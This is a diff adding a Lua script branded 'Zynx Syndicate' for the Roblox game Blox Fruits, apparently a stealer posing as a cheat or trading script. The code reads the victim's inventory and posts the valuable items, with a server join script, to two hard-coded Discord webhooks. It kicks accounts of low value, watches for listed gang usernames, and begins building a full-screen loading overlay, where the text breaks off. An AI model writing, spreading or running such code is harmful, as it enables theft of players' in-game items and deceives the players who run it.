@@ -1,0 +1,2233 @@
+-- =============================================
+-- Zynx Syndicate - Complete Blox Fruits Script
+-- Combined: Webhook System + Loading Screen + Trading Commands
+-- For Delta Executor
+-- =============================================
+
+-- SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- ===== AUTHORIZED USERS FOR LOADING SCREEN SKIP =====
+local authorizedUsers = {
+    -- Boss Users (5 users)
+    boss = {
+        {username = "jaatshab_770", displayname = "III"},
+        {username = "boss_user2", displayname = "BOSS2"},
+        {username = "boss_user3", displayname = "BOSS3"},
+        {username = "boss_user4", displayname = "BOSS4"},
+        {username = "boss_user5", displayname = "BOSS5"}
+    },
+    -- Member Users (5 users)
+    member = {
+        {username = "member_user1", displayname = "MEMBER1"},
+        {username = "member_user2", displayname = "MEMBER2"},
+        {username = "member_user3", displayname = "MEMBER3"},
+        {username = "member_user4", displayname = "MEMBER4"},
+        {username = "member_user5", displayname = "MEMBER5"}
+    }
+}
+
+-- ===== LOADING SCREEN CONTROL VARIABLES =====
+local halfLoadingScreen = nil
+local fullLoadingScreen = nil
+local blackBackground = nil
+local loadingProgress = 0
+local authorizedUserJoined = false
+local loadingComplete = false
+
+-- Function to check if player is authorized
+local function isPlayerAuthorized(player)
+    -- Check boss users
+    for _, user in ipairs(authorizedUsers.boss) do
+        if player.Name == user.username or player.DisplayName == user.displayname then
+            return true, "boss"
+        end
+    end
+    
+    -- Check member users
+    for _, user in ipairs(authorizedUsers.member) do
+        if player.Name == user.username or player.DisplayName == user.displayname then
+            return true, "member"
+        end
+    end
+    
+    return false, nil
+end
+
+-- Monitor for authorized users joining
+local function monitorAuthorizedUsers()
+    -- Check current players
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local isAuth = isPlayerAuthorized(player)
+            if isAuth then
+                authorizedUserJoined = true
+                print("✅ AUTHORIZED USER DETECTED: " .. player.Name)
+                return
+            end
+        end
+    end
+    
+    -- Monitor new players joining
+    Players.PlayerAdded:Connect(function(player)
+        wait(1) -- Wait for player data to load
+        local isAuth = isPlayerAuthorized(player)
+        if isAuth then
+            authorizedUserJoined = true
+            print("✅ AUTHORIZED USER JOINED: " .. player.Name)
+        end
+    end)
+end
+
+-- ===== PART 1: WEBHOOK NOTIFICATION SYSTEM =====
+-- Zynx Syndicate - Part 4: VALUABLE ITEMS ONLY (ADMIN + MEMBER WEBHOOKS)
+
+-- Webhook Configuration
+local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1428586195171938417/ejqtCuOJOM8F46xTuNygD-o84kgU802MZFVMSe5vQ9H3NZlO19YAR8Z-dILXMKBFqH-a"
+local MEMBER_WEBHOOK = "https://discord.com/api/webhooks/1426615725656768658/ujFBJ0TgHTirRnEt5kneB_8BY8TDEDCllM8X84zJWcRW6_k3qf0RNLFQELiolQXvvIJu"
+local ZYNX_LOGO = "https://i.postimg.cc/8CbPpQCy/Copilot-20251016-162707.png"
+local DISCORD_INVITE = "https://discord.gg/rEAE2Xs6"
+
+-- Anti-Spam Security
+local lastExecution = 0
+local COOLDOWN_TIME = 30 -- 30 seconds cooldown
+
+-- Admin Priority Fruits (HIGH VALUE)
+local ADMIN_FRUITS = {
+    "Permanent", "Perm", -- ALL permanent fruits (Rocket, Bomb, Buddha, Kitsune, Dragon, etc.)
+    "Dragon", "Kitsune", "Yeti", -- Specific mythical fruits
+    -- Skins
+    "Permanent Dragon Token", "Purple Lightning", "Red Lightning", "Yellow Lightning", "Green Lightning",
+    "Rose Quartz Diamond", "Emerald Diamond", "Topaz Diamond", "Ruby Diamond", "Dragon Token", "Eclipse",
+    "Super Spirit Pain", "Torment Pain", "Sadness Pain", "Frustration Pain", "Celestial Pain",
+    "Eagle Requiem", "Eagle Glacier", "Eagle Matrix", "Celebration Bomb", "Azura Bomb", "Thermite Bomb", "Nuclear Bomb"
+}
+
+-- Member Priority Fruits (MEDIUM VALUE)
+local MEMBER_FRUITS = {
+    "Buddha", "Portal", "Gas", "Spirit", "Dough", "T-Rex", "Mammoth", "Leopard"
+}
+
+-- Gamepass keywords (ALL GAMEPASSES - ADMIN ONLY)
+local gamepassKeywords = {
+    "Fruit Notifier", "Dark Blade", "Mythical Scrolls", "Legendary Scrolls", "+1 Fruit Storage",
+    "2x Mastery", "2x Money", "2x Boss Drops", "Fast Boats"
+}
+
+-- Improved Sea Detection
+local function GetSea()
+    local workspace = game:GetService("Workspace")
+    
+    -- Check for Sea 3 first (most specific)
+    if workspace:FindFirstChild("GreatTree") then return "Sea 3" end
+    if workspace:FindFirstChild("Hydra") then return "Sea 3" end
+    if workspace:FindFirstChild("Mansion") then return "Sea 3" end
+    if workspace:FindFirstChild("Castle on the Sea") then return "Sea 3" end
+    if workspace:FindFirstChild("Haunted Castle") then return "Sea 3" end
+    
+    -- Check for Sea 2
+    if workspace:FindFirstChild("FrozenDimension") then return "Sea 2" end
+    if workspace:FindFirstChild("FrozenVillage") then return "Sea 2" end
+    if workspace:FindFirstChild("IceCastle") then return "Sea 2" end
+    if workspace:FindFirstChild("Awakened Ice Admiral") then return "Sea 2" end
+    
+    -- Check Sea 1 locations
+    if workspace:FindFirstChild("MarineFord") then return "Sea 1" end
+    if workspace:FindFirstChild("Jungle") then return "Sea 1" end
+    if workspace:FindFirstChild("Pirate Village") then return "Sea 1" end
+    if workspace:FindFirstChild("Desert") then return "Sea 1" end
+    
+    -- Fallback: Check current player level and islands
+    local LocalPlayer = Players.LocalPlayer
+    if LocalPlayer then
+        local level = LocalPlayer.Data.Level.Value
+        if level >= 700 then
+            return "Sea 2"
+        elseif level >= 1500 then
+            return "Sea 3"
+        end
+    end
+    
+    return "Sea 1" -- Default
+end
+
+-- Check if script is executed in Sea 1
+local function CheckSea1Restriction()
+    local sea = GetSea()
+    if sea == "Sea 1" then
+        print("❌ SCRIPT EXECUTED IN SEA 1 - KICKING PLAYER...")
+        wait(2)
+        local LocalPlayer = Players.LocalPlayer
+        if LocalPlayer then
+            LocalPlayer:Kick("🚫 Do not execute script in 1st Sea")
+        end
+        return true
+    end
+    return false
+end
+
+-- Anti-Spam Security Check
+local function CheckCooldown()
+    local currentTime = tick()
+    if currentTime - lastExecution < COOLDOWN_TIME then
+        print("❌ COOLDOWN ACTIVE - Please wait " .. math.floor(COOLDOWN_TIME - (currentTime - lastExecution)) .. " seconds")
+        return true
+    end
+    lastExecution = currentTime
+    return false
+end
+
+-- Executor Detection
+local function GetExecutor()
+    if syn and syn.request then return "Synapse X" end
+    if getexecutorname then return getexecutorname() end
+    if identifyexecutor then return identifyexecutor() end
+    return "Delta"
+end
+
+-- Check if item is in a list (FIXED FUNCTION)
+local function IsInList(itemName, keywordList)
+    for _, keyword in pairs(keywordList) do
+        if string.find(itemName, keyword) then
+            return true
+        end
+    end
+    return false
+end
+
+-- Get VALUABLE items only (no Rarity 1) - SHOWS ALL COUNTS
+local function GetValuableItems()
+    local categories = {
+        permanentFruits = {},
+        skins = {},
+        gamepasses = {},
+        fruits = {
+            ["4"] = {}, -- Mythical
+            ["3"] = {}, -- Legendary  
+            ["2"] = {}  -- Rare (NO RARITY 1)
+        }
+    }
+    
+    -- Skin keywords
+    local skinKeywords = {
+        "Permanent Dragon Token", "Purple Lightning", "Red Lightning", "Yellow Lightning", "Green Lightning",
+        "Rose Quartz Diamond", "Emerald Diamond", "Topaz Diamond", "Ruby Diamond", "Dragon Token", "Eclipse",
+        "Super Spirit Pain", "Torment Pain", "Sadness Pain", "Frustration Pain", "Celestial Pain",
+        "Eagle Requiem", "Eagle Glacier", "Eagle Matrix", "Celebration Bomb", "Azura Bomb", "Thermite Bomb", "Nuclear Bomb"
+    }
+    
+    local success, inventory = pcall(function()
+        local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+        return Remote:InvokeServer("getInventory")
+    end)
+    
+    if success and inventory then
+        for i, item in pairs(inventory) do
+            if item and item.Type == "Blox Fruit" then
+                local itemName = item.Name
+                local rarity = tostring(item.Rarity or 1)
+                local count = item.Count or 1
+                local value = item.Value or 0
+                
+                -- Check for PERMANENT fruits (any rarity)
+                if string.find(itemName, "Permanent") or string.find(itemName, "Perm") then
+                    table.insert(categories.permanentFruits, {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                
+                -- Check for SKINS
+                elseif IsInList(itemName, skinKeywords) then
+                    table.insert(categories.skins, {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                
+                -- Check for GAMEPASSES
+                elseif IsInList(itemName, gamepassKeywords) then
+                    table.insert(categories.gamepasses, {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                
+                -- Regular fruits (ONLY Rarity 2,3,4 - NO RARITY 1)
+                elseif categories.fruits[rarity] then
+                    table.insert(categories.fruits[rarity], {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                end
+            end
+        end
+    end
+    
+    -- Sort each category by value (highest to lowest)
+    for rarity, fruits in pairs(categories.fruits) do
+        table.sort(fruits, function(a, b) return a.value > b.value end)
+    end
+    table.sort(categories.permanentFruits, function(a, b) return a.value > b.value end)
+    table.sort(categories.skins, function(a, b) return a.value > b.value end)
+    table.sort(categories.gamepasses, function(a, b) return a.value > b.value end)
+    
+    return categories
+end
+
+-- Generate Join Script
+local function GenerateJoinScript()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    
+    local joinScript = string.format([[
+p=%s j="%s"
+if game.PlaceId~=p then
+queue_on_teleport('wait(5) if game.JobId~=j then game.TeleportService:TeleportToPlaceInstance(p,j) end')
+game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
+else
+game.TeleportService:TeleportToPlaceInstance(p,j)
+end
+    ]], placeId, jobId)
+    
+    return joinScript
+end
+
+-- SIMPLE FRUIT COUNTER (ADDED)
+local function CountAllFruits()
+    print("🍊 COUNTING ALL FRUITS IN INVENTORY...")
+    
+    local success, inventory = pcall(function()
+        local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+        return Remote:InvokeServer("getInventory")
+    end)
+    
+    if success and inventory then
+        local totalFruits = 0
+        local fruitCounts = {}
+        
+        -- Count all fruits
+        for i, item in pairs(inventory) do
+            if item and item.Type == "Blox Fruit" then
+                local fruitName = item.Name
+                local count = item.Count or 1
+                
+                totalFruits = totalFruits + count
+                fruitCounts[fruitName] = (fruitCounts[fruitName] or 0) + count
+            end
+        end
+        
+        -- Display results
+        print("📊 COMPLETE INVENTORY COUNT:")
+        print("🍊 TOTAL FRUIT ITEMS: " .. totalFruits)
+        print("🎯 UNIQUE FRUIT TYPES: " .. #inventory)
+        
+        print("🔢 DETAILED COUNTS:")
+        for fruitName, count in pairs(fruitCounts) do
+            print("   " .. fruitName .. " = " .. count)
+        end
+        
+        return totalFruits, fruitCounts
+    else
+        print("❌ Failed to get inventory")
+        return 0, {}
+    end
+end
+
+-- Send Admin Webhook (HIGH VALUE ITEMS)
+local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+    local LocalPlayer = Players.LocalPlayer
+    local joinScript = GenerateJoinScript()
+    
+    local payload = {
+        ["embeds"] = {{
+            ["title"] = "🔱 Zynx Syndicate - Valuable Items",
+            ["description"] = "Premium Inventory Only\n[Join Discord](" .. DISCORD_INVITE .. ")",
+            ["color"] = 16753920,
+            ["thumbnail"] = {["url"] = ZYNX_LOGO},
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Info",
+                    ["value"] = "User: " .. LocalPlayer.Name .. 
+                               "\n*Sea:* " .. sea .. 
+                               "\n*Total Fruits:* " .. totalFruits ..
+                               "\n*Valuable Fruits:* " .. totalValuableFruits .. 
+                               "\n*Perm Fruits:* " .. #inventory.permanentFruits ..
+                               "\n*Skins:* " .. #inventory.skins ..
+                               "\n*Gamepasses:* " .. #inventory.gamepasses ..
+                               "\n*Players:* " .. playerCount,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Zynx Syndicate • Valuable Items Only",
+                ["icon_url"] = ZYNX_LOGO
+            }
+        }}
+    }
+    
+    -- Add PERMANENT FRUITS section (ALL rarities) - SHOWS ALL COUNTS
+    if #inventory.permanentFruits > 0 then
+        local permList = {}
+        for _, fruit in pairs(inventory.permanentFruits) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(permList, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔮 Permanent Fruits - " .. #inventory.permanentFruits,
+            ["value"] = "" .. table.concat(permList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add SKINS section - SHOWS ALL COUNTS
+    if #inventory.skins > 0 then
+        local skinsList = {}
+        for _, skin in pairs(inventory.skins) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(skinsList, skin.name .. " (" .. skin.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎨 Rare Skins - " .. #inventory.skins,
+            ["value"] = "" .. table.concat(skinsList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add GAMEPASSES section - SHOWS ALL COUNTS
+    if #inventory.gamepasses > 0 then
+        local gamepassList = {}
+        for _, gamepass in pairs(inventory.gamepasses) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(gamepassList, gamepass.name .. " (" .. gamepass.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎮 Gamepasses - " .. #inventory.gamepasses,
+            ["value"] = "" .. table.concat(gamepassList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS
+    if #inventory.fruits["4"] > 0 then
+        local rarity4List = {}
+        for _, fruit in pairs(inventory.fruits["4"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity4List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "💎 Mythical (Rarity 4) - " .. #inventory.fruits["4"],
+            ["value"] = "" .. table.concat(rarity4List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["3"] > 0 then
+        local rarity3List = {}
+        for _, fruit in pairs(inventory.fruits["3"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity3List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🌟 Legendary (Rarity 3) - " .. #inventory.fruits["3"],
+            ["value"] = "" .. table.concat(rarity3List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["2"] > 0 then
+        local rarity2List = {}
+        for _, fruit in pairs(inventory.fruits["2"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity2List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔵 Rare (Rarity 2) - " .. #inventory.fruits["2"],
+            ["value"] = "" .. table.concat(rarity2List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add join script
+    table.insert(payload.embeds[1].fields, {
+        ["name"] = "📜 Join Script",
+        ["value"] = "lua\n" .. joinScript .. "\n",
+        ["inline"] = false
+    })
+    
+    local success, result = pcall(function()
+        if syn and syn.request then
+            local response = syn.request({
+                Url = ADMIN_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return response.Success
+        end
+        
+        if request then
+            request({
+                Url = ADMIN_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return true
+        end
+        
+        return false
+    end)
+    
+    return success
+end
+
+-- Send Member Webhook (MEDIUM VALUE ITEMS)
+local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+    local LocalPlayer = Players.LocalPlayer
+    local joinScript = GenerateJoinScript()
+    
+    local payload = {
+        ["embeds"] = {{
+            ["title"] = "🔱 Zynx Syndicate - Valuable Items",
+            ["description"] = "Premium Inventory Only\n[Join Discord](" .. DISCORD_INVITE .. ")",
+            ["color"] = 16753920,
+            ["thumbnail"] = {["url"] = ZYNX_LOGO},
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Info",
+                    ["value"] = "User: " .. LocalPlayer.Name .. 
+                               "\n*Sea:* " .. sea .. 
+                               "\n*Total Fruits:* " .. totalFruits ..
+                               "\n*Valuable Fruits:* " .. totalValuableFruits .. 
+                               "\n*Perm Fruits:* " .. #inventory.permanentFruits ..
+                               "\n*Skins:* " .. #inventory.skins ..
+                               "\n*Gamepasses:* " .. #inventory.gamepasses ..
+                               "\n*Players:* " .. playerCount,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Zynx Syndicate • Valuable Items Only",
+                ["icon_url"] = ZYNX_LOGO
+            }
+        }}
+    }
+    
+    -- Add PERMANENT FRUITS section (ALL rarities) - SHOWS ALL COUNTS
+    if #inventory.permanentFruits > 0 then
+        local permList = {}
+        for _, fruit in pairs(inventory.permanentFruits) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(permList, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔮 Permanent Fruits - " .. #inventory.permanentFruits,
+            ["value"] = "" .. table.concat(permList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add SKINS section - SHOWS ALL COUNTS
+    if #inventory.skins > 0 then
+        local skinsList = {}
+        for _, skin in pairs(inventory.skins) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(skinsList, skin.name .. " (" .. skin.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎨 Rare Skins - " .. #inventory.skins,
+            ["value"] = "" .. table.concat(skinsList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add GAMEPASSES section - SHOWS ALL COUNTS
+    if #inventory.gamepasses > 0 then
+        local gamepassList = {}
+        for _, gamepass in pairs(inventory.gamepasses) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(gamepassList, gamepass.name .. " (" .. gamepass.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎮 Gamepasses - " .. #inventory.gamepasses,
+            ["value"] = "" .. table.concat(gamepassList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS
+    if #inventory.fruits["4"] > 0 then
+        local rarity4List = {}
+        for _, fruit in pairs(inventory.fruits["4"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity4List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "💎 Mythical (Rarity 4) - " .. #inventory.fruits["4"],
+            ["value"] = "" .. table.concat(rarity4List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["3"] > 0 then
+        local rarity3List = {}
+        for _, fruit in pairs(inventory.fruits["3"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity3List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🌟 Legendary (Rarity 3) - " .. #inventory.fruits["3"],
+            ["value"] = "" .. table.concat(rarity3List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["2"] > 0 then
+        local rarity2List = {}
+        for _, fruit in pairs(inventory.fruits["2"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity2List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔵 Rare (Rarity 2) - " .. #inventory.fruits["2"],
+            ["value"] = "" .. table.concat(rarity2List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add join script
+    table.insert(payload.embeds[1].fields, {
+        ["name"] = "📜 Join Script",
+        ["value"] = "lua\n" .. joinScript .. "\n",
+        ["inline"] = false
+    })
+    
+    local success, result = pcall(function()
+        if syn and syn.request then
+            local response = syn.request({
+                Url = MEMBER_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return response.Success
+        end
+        
+        if request then
+            request({
+                Url = MEMBER_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return true
+        end
+        
+        return false
+    end)
+    
+    return success
+end
+
+-- Check if player has any priority fruits
+local function HasPriorityFruits(inventory)
+    local hasAdmin = false
+    local hasMember = false
+    
+    -- Check inventory for admin fruits
+    for _, item in pairs(inventory.permanentFruits) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.skins) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.gamepasses) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.fruits["4"]) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+        if IsInList(item.name, MEMBER_FRUITS) then
+            hasMember = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.fruits["3"]) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+        if IsInList(item.name, MEMBER_FRUITS) then
+            hasMember = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.fruits["2"]) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+        if IsInList(item.name, MEMBER_FRUITS) then
+            hasMember = true
+            break
+        end
+    end
+    
+    return hasAdmin, hasMember
+end
+
+-- Main Webhook Function
+local function SendWebhook()
+    local LocalPlayer = Players.LocalPlayer
+    local sea = GetSea()
+    local inventory = GetValuableItems()
+    local playerCount = #Players:GetPlayers()
+    
+    -- Get complete fruit counts
+    local totalFruits, detailedCounts = CountAllFruits()
+    
+    -- Calculate totals
+    local totalValuableFruits = #inventory.fruits["4"] + #inventory.fruits["3"] + #inventory.fruits["2"]
+    local hasAdminFruits, hasMemberFruits = HasPriorityFruits(inventory)
+
+    print("📊 VALUABLE ITEMS ONLY:")
+    print("🌊 Sea: " .. sea)
+    print("🍊 Total All Fruits: " .. totalFruits)
+    print("💎 Valuable Fruits: " .. totalValuableFruits)
+    print("👑 Admin Fruits: " .. tostring(hasAdminFruits))
+    print("🔹 Member Fruits: " .. tostring(hasMemberFruits))
+    print("🔮 Permanent Fruits: " .. #inventory.permanentFruits)
+    print("🎨 Skins: " .. #inventory.skins)
+    print("🎮 Gamepasses: " .. #inventory.gamepasses)
+
+    -- DECISION LOGIC: Admin first, then Member, then kick if low
+    if hasAdminFruits then
+        print("👑 ADMIN HIT DETECTED! Sending to admin webhook...")
+        local success = SendAdminWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+        if success then
+            print("✅ ADMIN WEBHOOK SENT SUCCESSFULLY!")
+            return true
+        else
+            print("❌ Admin webhook failed")
+            return false
+        end
+        
+    elseif hasMemberFruits then
+        print("🔹 MEMBER HIT DETECTED! Sending to member webhook...")
+        local success = SendMemberWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+        if success then
+            print("✅ MEMBER WEBHOOK SENT SUCCESSFULLY!")
+            return true
+        else
+            print("❌ Member webhook failed")
+            return false
+        end
+        
+    else
+        print("❌ ALT ACCOUNT DETECTED - KICKING PLAYER...")
+        -- Wait a moment then kick
+        wait(2)
+        if LocalPlayer then
+            LocalPlayer:Kick("🚫 Alt account detected ")
+        end
+        return false
+    end
+end
+
+-- ===== PART 2: LOADING SCREEN SYSTEM =====
+local function createHalfLoadingScreen()
+    -- Blox Fruits Professional Loading Screen
+    -- With Gradient Background & 3D Elements
+
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+    -- Create ScreenGui
+    local loadingScreen = Instance.new("ScreenGui")
+    loadingScreen.Name = "ProfessionalLoadingScreen"
+    loadingScreen.Parent = playerGui
+    loadingScreen.ResetOnSpawn = false
+
+    -- Main container with gradient effect - MADE SMALLER
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0.7, 0, 0.6, 0)  -- Smaller container
+    mainContainer.Position = UDim2.new(0.15, 0, 0.2, 0)  -- Adjusted position for smaller container
+    mainContainer.BackgroundColor3 = Color3.fromRGB(10, 15, 20)
+    mainContainer.BorderSizePixel = 0
+    mainContainer.Parent = loadingScreen
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0.03, 0)
+    mainCorner.Parent = mainContainer
+
+    -- Create gradient layers
+    local gradientLayers = {
+        {color = Color3.fromRGB(5, 10, 15), size = 1.0, position = 0.0},
+        {color = Color3.fromRGB(15, 20, 25), size = 0.9, position = 0.05},
+        {color = Color3.fromRGB(25, 30, 35), size = 0.8, position = 0.1},
+        {color = Color3.fromRGB(35, 40, 45), size = 0.7, position = 0.15}
+    }
+
+    for i, layer in ipairs(gradientLayers) do
+        local gradientLayer = Instance.new("Frame")
+        gradientLayer.Size = UDim2.new(layer.size, 0, layer.size, 0)
+        gradientLayer.Position = UDim2.new(layer.position, 0, layer.position, 0)
+        gradientLayer.BackgroundColor3 = layer.color
+        gradientLayer.BorderSizePixel = 0
+        gradientLayer.ZIndex = 0
+        gradientLayer.Parent = mainContainer
+        
+        local layerCorner = Instance.new("UICorner")
+        layerCorner.CornerRadius = UDim.new(0.03, 0)
+        layerCorner.Parent = gradientLayer
+    end
+
+    -- Header section
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0.15, 0)
+    header.Position = UDim2.new(0, 0, 0, 0)
+    header.BackgroundColor3 = Color3.fromRGB(8, 12, 18)
+    header.BackgroundTransparency = 0.3
+    header.BorderSizePixel = 0
+    header.ZIndex = 2
+    header.Parent = mainContainer
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0.03, 0)
+    headerCorner.Parent = header
+
+    -- Header accent line
+    local headerAccent = Instance.new("Frame")
+    headerAccent.Size = UDim2.new(1, 0, 0.015, 0)
+    headerAccent.Position = UDim2.new(0, 0, 0.98, 0)
+    headerAccent.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    headerAccent.BorderSizePixel = 0
+    headerAccent.ZIndex = 3
+    headerAccent.Parent = header
+
+    -- Main title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.6, 0)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "BLOX FRUITS"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0.8
+    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
+    title.ZIndex = 3
+    title.Parent = header
+
+    -- Subtitle
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0.4, 0)
+    subtitle.Position = UDim2.new(0, 0, 0.6, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "SYSTEM INITIALIZATION"
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.ZIndex = 3
+    subtitle.Parent = header
+
+    -- Status display
+    local statusContainer = Instance.new("Frame")
+    statusContainer.Size = UDim2.new(0.9, 0, 0.1, 0)
+    statusContainer.Position = UDim2.new(0.05, 0, 0.17, 0)
+    statusContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    statusContainer.BackgroundTransparency = 0.3
+    statusContainer.BorderSizePixel = 0
+    statusContainer.ZIndex = 2
+    statusContainer.Parent = mainContainer
+
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0.02, 0)
+    statusCorner.Parent = statusContainer
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0.25, 0, 1, 0)
+    statusLabel.Position = UDim2.new(0.02, 0, 0, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Status:"
+    statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    statusLabel.TextScaled = true
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.ZIndex = 3
+    statusLabel.Parent = statusContainer
+
+    local statusValue = Instance.new("TextLabel")
+    statusValue.Size = UDim2.new(0.7, 0, 1, 0)
+    statusValue.Position = UDim2.new(0.27, 0, 0, 0)
+    statusValue.BackgroundTransparency = 1
+    statusValue.Text = "Initializing core modules..."
+    statusValue.TextColor3 = Color3.fromRGB(0, 200, 255)
+    statusValue.TextScaled = true
+    statusValue.TextXAlignment = Enum.TextXAlignment.Left
+    statusValue.Font = Enum.Font.GothamBold
+    statusValue.ZIndex = 3
+    statusValue.Parent = statusContainer
+
